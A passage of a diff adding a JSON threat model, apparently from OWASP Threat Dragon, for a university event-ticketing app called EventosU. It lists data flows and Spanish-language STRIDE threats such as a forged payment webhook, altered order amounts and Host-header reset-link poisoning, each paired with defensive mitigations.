+                  "labelText": {
+                    "text": "Evento y afiche\n(HTTPS, multipart)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Evento y afiche\n(HTTPS, multipart)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "1ca991a1-865f-53df-b7a5-db45474e5926",
+            "source": {
+              "cell": "1ea75a5f-45a5-563a-82e2-ffb32cf4bd52"
+            },
+            "target": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "vertices": [
+              {
+                "x": 300,
+                "y": 640
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Gestión de usuarios\ny roles (HTTPS)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Gestión de usuarios\ny roles (HTTPS)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "90cc2106-2b81-54ed-bc74-7f31d0c682d0",
+            "source": {
+              "cell": "a626d93c-c497-540a-b56f-68735e1bf324"
+            },
+            "target": {
+              "cell": "bff32435-3f00-5a9f-ba45-4f49a1a7a3ff"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Imagen del QR\n(cámara)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Imagen del QR\n(cámara)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "Local",
+              "isEncrypted": false,
+              "isPublicNetwork": false,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "4ec5269b-08fb-521d-9327-2c81b96937e2",
+            "source": {
+              "cell": "95b62b98-f02a-52cc-ad76-833efc5ccf02"
+            },
+            "target": {
+              "cell": "8b233968-770b-520b-8502-224fc2814dd1"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Token JWT\n(localStorage)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Token JWT\n(localStorage)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "Local",
+              "isEncrypted": false,
+              "isPublicNetwork": false,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "f23fa1ba-1208-5f4a-90e6-e102198c8ede",
+            "source": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "target": {
+              "cell": "0f183aab-713e-50a0-a590-1c412887769c"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Peticiones REST con JWT\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Peticiones REST con JWT\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "481047f1-feae-5c6a-bd8d-8f4c2072316c",
+                  "title": "T14 Relleno de credenciales en el login local",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "Un atacante que dispone de listas de correos y contraseñas filtradas de otros sitios puede probarlas de forma automatizada contra el login local de EventosU, y obtiene acceso a cuentas de estudiantes con sus entradas y datos, o a cuentas de organizadores que reutilizan contraseñas.",
+                  "mitigation": "Respuesta: Mitigar. El login permite 5 intentos por cuenta en 15 minutos con bloqueo progresivo y el WAF limita intentos por IP, las contraseñas nuevas se comparan con la base de contraseñas filtradas de Have I Been Pwned mediante k-anonimato y las cuentas de organizador y administrador exigen MFA.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 14,
+                  "score": "6 (I2 x P3, Alto)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "9cb61488-9edb-511e-8f34-ed6c55753835",
+            "source": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "target": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "vertices": [
+              {
+                "x": 760,
+                "y": 600
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Operaciones /admin\ncon JWT (HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Operaciones /admin\ncon JWT (HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "1b05d972-f48f-51b1-b601-ff1904e33d1f",
+            "source": {
+              "cell": "bff32435-3f00-5a9f-ba45-4f49a1a7a3ff"
+            },
+            "target": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "vertices": [
+              {
+                "x": 760,
+                "y": 840
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Validación de QR:\nválido / ya usado\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Validación de QR:\nválido / ya usado\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "f6347b01-3214-58ad-96c9-a2fc71b5b155",
+                  "title": "T05 QR generado con el identificador de otra inscripción",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "Un asistente que observa que su QR contiene solo el número secuencial de su inscripción puede generar con una aplicación gratuita códigos con números cercanos y presentarlos en puerta, y obtiene el ingreso suplantando a otro inscrito que pagó y que todavía no ha llegado.",
+                  "mitigation": "Respuesta: Mitigar. El QR contiene un token aleatorio de 128 bits generado con un CSPRNG y asociado a una sola inscripción, la API nunca acepta identificadores secuenciales de base de datos y la validación comprueba que el token pertenezca al evento y a la fecha en curso.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 5,
+                  "score": "9 (I3 x P3, Crítico)"
+                },
+                {
+                  "id": "0a37a687-a5fb-5cb0-ac74-7b356046614f",
+                  "title": "T07 Endpoint de validación usado por cualquier usuario",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Elevation of privilege",
+                  "description": "Un estudiante autenticado que descubre el endpoint de validación en el tráfico de la app puede llamarlo con QR de otros asistentes publicados en redes sociales, y obtiene la capacidad de marcarlos como usados, con lo cual sus titulares quedan fuera del evento.",
+                  "mitigation": "Respuesta: Mitigar. El endpoint de validación exige un JWT con rol “puerta”, verifica que el miembro del personal esté asignado a ese evento y que la validación ocurra dentro de la ventana horaria del evento, y registra el dispositivo y el usuario que realizan cada validación.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 7,
+                  "score": "4 (I2 x P2, Medio)"
+                },
+                {
+                  "id": "94d46685-3d12-5fff-9fe9-7da918ba2562",
+                  "title": "T08 Datos personales en la respuesta de validación",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Information disclosure",
+                  "description": "Un tercero que encuentra o roba un teléfono de puerta desbloqueado puede revisar el historial de la app, y obtiene nombre, carné y teléfono de cada asistente validado si la API devuelve el registro completo de la inscripción en cada respuesta.",
+                  "mitigation": "Respuesta: Mitigar. La respuesta de validación devuelve solo el resultado (“válido” o “ya usado”) y el nombre abreviado del asistente, la app no guarda historial local y el JWT del personal de puerta expira al cierre del evento.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 8,
+                  "score": "2 (I2 x P1, Bajo)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "c52d3f7a-fdca-57a7-8da8-399b15c301e2",
+            "source": {
+              "cell": "8b233968-770b-520b-8502-224fc2814dd1"
+            },
+            "target": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "vertices": [
+              {
+                "x": 800,
+                "y": 1060
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Login institucional\n(HTTPS, OAuth 2.0\n+ PKCE)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Login institucional\n(HTTPS, OAuth 2.0\n+ PKCE)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "4d528cef-b252-5646-9bb5-1b68c59aa290",
+            "source": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "target": {
+              "cell": "c217e0f7-0b97-5815-8e56-c81dae264d8d"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Canje de código\ny claves JWKS\n(HTTPS, OIDC)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Canje de código\ny claves JWKS\n(HTTPS, OIDC)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "abebc1f4-1cc1-5cc3-bc9d-35586f814348",
+                  "title": "T15 Token de Entra ID aceptado sin validar audiencia y estado",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "Un atacante con cuenta en el mismo tenant de Microsoft puede presentar a la API un id_token emitido para otra aplicación del tenant o iniciar un flujo sin parámetro state, y obtiene una sesión en EventosU con la identidad de otro usuario si la API no valida audiencia, emisor, nonce y state.",
+                  "mitigation": "Respuesta: Mitigar. La API usa el flujo de código de autorización con PKCE, valida state y nonce, verifica la firma del id_token con las claves JWKS de Entra ID y comprueba que iss, aud y tid correspondan a la aplicación registrada y al tenant de la universidad.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 15,
+                  "score": "6 (I3 x P2, Alto)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "a98f2fff-7454-52b1-ab80-aa3466a24622",
+            "source": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "target": {
+              "cell": "c217e0f7-0b97-5815-8e56-c81dae264d8d"
+            },
+            "vertices": [
+              {
+                "x": 820,
+                "y": 330
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Creación de orden\nde pago\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Creación de orden\nde pago\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "84eb5865-5e9c-59a4-ae22-5ed718d41844",
+            "source": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "target": {
+              "cell": "7ba88cd4-43a1-5b27-b2f2-2f0431382951"
+            },
+            "vertices": [
+              {
+                "x": 1010,
+                "y": 360
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Redirección al pago\ncon ID de orden\n(HTTPS, navegador)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Redirección al pago\ncon ID de orden\n(HTTPS, navegador)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "cbc2f002-e762-52b4-a280-0ef1679d9762",
+                  "title": "T02 Monto de la orden alterado en la redirección",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "Un estudiante que intercepta con un proxy local la redirección hacia la pasarela puede cambiar el monto de la orden de Q150 a Q1, completa el pago con el monto alterado y obtiene la entrada, porque la API solo revisa que el webhook indique “aprobado”.",
+                  "mitigation": "Respuesta: Mitigar. La orden se crea servidor a servidor con el monto calculado por la API a partir del precio del evento, el navegador solo recibe el identificador de orden y, al llegar el webhook, la API compara monto, moneda e identificador de orden con lo registrado en la inscripción, rechaza cualquier diferencia y la registra como alerta.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 2,
+                  "score": "6 (I3 x P2, Alto)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "dc97e14f-2ca3-5ae4-ac25-9b05976b028b",
+            "source": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "target": {
+              "cell": "7ba88cd4-43a1-5b27-b2f2-2f0431382951"
+            },
+            "vertices": [
+              {
+                "x": 640,
+                "y": 300
+              },
+              {
+                "x": 900,
+                "y": 225
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Webhook de pago\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Webhook de pago\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "2f0de00f-f59d-5682-9dd9-1316c14270b3",
+                  "title": "T01 Webhook de pago falsificado",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "Un estudiante que identifica la ruta pública del webhook en la documentación del proveedor o en el tráfico de su propia compra puede enviar un POST con estado “aprobado” y el identificador de su inscripción, y obtiene la inscripción marcada como pagada junto con su entrada QR sin haber pagado.",
+                  "mitigation": "Respuesta: Mitigar. La API valida la firma HMAC-SHA256 que el proveedor incluye en cada notificación con un secreto guardado en el gestor de secretos, compara la firma en tiempo constante, rechaza mensajes con marca de tiempo mayor a 5 minutos y, antes de marcar la inscripción, consulta el estado de la transacción en la API del proveedor por un canal servidor a servidor.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 1,
+                  "score": "9 (I3 x P3, Crítico)"
+                },
+                {
+                  "id": "9822ceeb-2c1f-5fc3-be27-12b51b62a0a9",
+                  "title": "T03 Sin evidencia de confirmaciones de pago",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "Un estudiante que pagó y luego solicita un contracargo a su banco puede afirmar que nunca recibió la entrada, y EventosU no tiene forma de demostrar cuándo llegó la confirmación ni cuándo se emitió y usó el QR, por lo que la universidad pierde la disputa.",
+                  "mitigation": "Respuesta: Mitigar. Cada webhook recibido se guarda en una tabla de solo inserción con el identificador de evento del proveedor, la firma, la marca de tiempo, el resultado de la validación y la inscripción afectada, y la emisión del QR y su uso en puerta quedan registrados en el almacén de logs con retención de un año.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 3,
+                  "score": "4 (I2 x P2, Medio)"
+                },
+                {
+                  "id": "a5182269-1644-52b3-a8f7-479a0b842cfb",
+                  "title": "T04 Saturación del endpoint del webhook",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "Un atacante que conoce el endpoint del webhook puede enviar miles de notificaciones falsas por segundo durante la apertura de inscripciones de un concierto, y obtiene que la API consuma CPU y conexiones de base de datos procesándolas, lo que retrasa las confirmaciones legítimas y deja inscripciones pagadas sin QR.",
+                  "mitigation": "Respuesta: Mitigar. El WAF solo permite tráfico hacia el webhook desde los rangos IP publicados por el proveedor y aplica un límite de 50 peticiones por segundo, la API descarta antes de consultar la base de datos todo mensaje sin firma válida y los mensajes válidos se procesan desde una cola con reintentos.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 4,
+                  "score": "4 (I2 x P2, Medio)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "c62d7fdd-d0cf-5e50-95c9-5a5b8634af58",
+            "source": {
+              "cell": "7ba88cd4-43a1-5b27-b2f2-2f0431382951"
+            },
+            "target": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "vertices": [
+              {
+                "x": 1150,
+                "y": 400
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Envío de QR o\nrestablecimiento\n(HTTPS, API REST)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Envío de QR o\nrestablecimiento\n(HTTPS, API REST)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "5875718f-1203-5e2f-9015-2d483d64e097",
+                  "title": "T19 Enlace de restablecimiento desviado con la cabecera Host",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "Un atacante que solicita el restablecimiento de contraseña de una víctima modificando la cabecera Host de la petición puede lograr que el enlace del correo apunte a su dominio, y obtiene el token de restablecimiento cuando la víctima hace clic, con lo que toma control de la cuenta.",
+                  "mitigation": "Respuesta: Mitigar. El enlace se construye con una URL base fija definida en la configuración, el token es aleatorio de 128 bits, de un solo uso, se guarda como hash y expira en 15 minutos, y todas las sesiones activas se cierran después del cambio de contraseña.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 19,
+                  "score": "6 (I3 x P2, Alto)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "ab1b1bb6-ceb6-5b84-a2cc-824edf411277",
+            "source": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "target": {
+              "cell": "897220cd-d140-5215-94e7-60a8fffe6a79"
+            },
+            "vertices": [
+              {
+                "x": 1350,
+                "y": 280
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Correo con QR o enlace de restablecimiento (SMTP con TLS)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Correo con QR o enlace de restablecimiento (SMTP con TLS)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "SMTP/TLS",
